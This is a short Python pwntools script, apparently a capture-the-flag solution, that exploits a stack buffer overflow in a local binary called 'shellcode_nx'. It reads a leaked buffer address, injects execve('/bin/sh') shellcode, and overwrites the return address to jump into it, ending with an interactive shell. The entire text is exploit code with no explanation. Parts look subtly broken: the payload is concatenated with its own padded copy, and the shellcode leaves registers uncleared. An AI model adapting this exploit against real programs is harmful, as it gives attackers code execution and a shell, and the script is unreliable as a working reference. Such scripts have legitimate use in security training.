#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

p = process('./shellcode_nx')

p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)

log.info(hex(buf))

sc = asm('''
        xor rsi, rsi
        mov rdi, rsi
        mov rdi, ''' + str(buf + 0x30) + '''
        mov al, 59
        syscall
''')

pause()

payload  = sc
payload += b'/bin/sh\0'
payload += payload.ljust(0x54, b'\x50')
payload += p64(0x9090909090909090) # rbp
payload += p64(buf) # ret addr
p.sendafter(b'name?', payload)

p.interactive()
